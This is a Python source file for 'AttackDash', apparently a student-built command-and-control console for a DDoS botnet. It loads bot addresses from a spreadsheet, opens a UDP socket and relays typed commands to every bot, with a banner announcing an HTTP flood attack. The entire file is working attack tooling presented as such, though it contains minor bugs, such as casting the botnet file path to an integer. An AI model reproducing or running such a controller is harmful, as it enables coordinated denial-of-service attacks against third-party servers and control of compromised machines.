# -*- coding: utf-8 -*-
"""
Created on Fri Jun  8 10:31:44 2018

@author: DrLC
"""

import socket
import pandas
import sys

PORT_DEFAULT = 2339
BOTNET_PATH_DEFAULT = 'botnet.xlsx'

def print_help():
    print()
    print("+--------------------------+")
    print("|                          |")
    print("|      AttackDash          |")
    print("|                          |")
    print("|       by TakingOffPKU    |")
    print("|                          |")
    print("+--------------------------+")
    print()
    print("Attacker's dash board, which controls the botnet.")
    print()
    print("Use the following command to start the dash")
    print("  python3 %s" % (sys.argv[0]))
    print("Optional arguments are:")
    print("  -P or --port\tListen port.")
    print("  -B or --botnet\tBotnet sheet path.")
    print("Example:")
    print("  python3 %s -P LISTEN_PORT"
          % (sys.argv[0]))
    print()


def getopt(ARGS):
    if '-h' in ARGS or '--help' in ARGS:
        try:
            assert False
        except:
            print_help()
            exit(0)
    ret = {"port": PORT_DEFAULT,
           "botnet": BOTNET_PATH_DEFAULT}
    for i in range(1, len(ARGS)):
        if i % 2 == 1:
            if ARGS[i] in ['-P', '--port']:
                ret['port'] = int(ARGS[i + 1])
            elif ARGS[i] in ['-B', '--botnet']:
                ret['botnet'] = int(ARGS[i + 1])
            else:
                try:
                    assert False
                except:
                    print_help()
                    exit(0)
    return ret

if __name__ == "__main__":
    
    args = getopt(sys.argv)
    port = args['port']
    botnet_path = args['botnet']
    print ()
    print ("+--------------------------+")
    print ("|                          |")
    print ("|      AttackDash          |")
    print ("|                          |")
    print ("|       by TakingOffPKU    |")
    print ("|                          |")
    print ("+--------------------------+")
    print ()
    print ("Port: %s" % port)
    print ("Botnet: %s" % botnet_path)
    print ()
    print ("HTTP flood attack will begin in")
    sheet = pandas.read_excel(botnet_path, sheetname='Sheet1')
    botnet = {'ip': [], 'port': []}
    for ip, port in zip(sheet['ip'], sheet['port']):
        botnet['ip'].append(ip)
        botnet['port'].append(port)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('0.0.0.0', port))
    while True:
        cmd = input("Command > ")
        for ip, port in zip(botnet['ip'], botnet['port']):
            s.sendto(bytes(cmd, encoding="utf-8"), (ip, port))
            if cmd.strip() == 'STATUS':
                resp, addr = s.recvfrom(1024)
                print (str(resp, encoding="utf-8"))
            if cmd.strip()[:4] == 'ECHO':
                resp, addr = s.recvfrom(1024)
                print (str(resp, encoding="utf-8"))